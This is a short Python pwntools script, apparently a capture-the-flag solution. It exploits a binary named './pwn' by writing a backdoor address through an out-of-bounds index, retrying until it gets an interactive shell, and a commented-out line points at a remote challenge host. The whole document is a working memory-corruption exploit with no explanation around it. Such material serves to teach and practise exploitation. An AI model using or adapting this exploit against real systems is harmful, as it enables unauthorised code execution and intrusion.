from pwn import*

context(os='linux', arch='amd64', log_level='debug')
backdoor = 0x401327
def back(index,content):
    r.recvuntil(b"index\n")
    r.sendline(str(index).encode())
    r.recvuntil(b"name:\n")
    r.sendline(content)
    r.recvuntil(b'id')
    r.sendline(str(0x38).encode())
while True:
    try:
        r = process('./pwn')
        # gdb.attach(r,"b * 0x401316")
        # r = remote('xyctf.top',60321)
        #for i in range(32):
            #back(i,p64(backdoor)*2)
        back(32,p64(backdoor)*2)
        r.recvuntil(b"index\n")
        r.sendline(b'-1')
        r.recvuntil(b"Have a good time!\n")
        data = r.recv()
        if b'find' in data:
            r.interactive()
            break
    
    except EOFError:
        r.close()
        continue

    
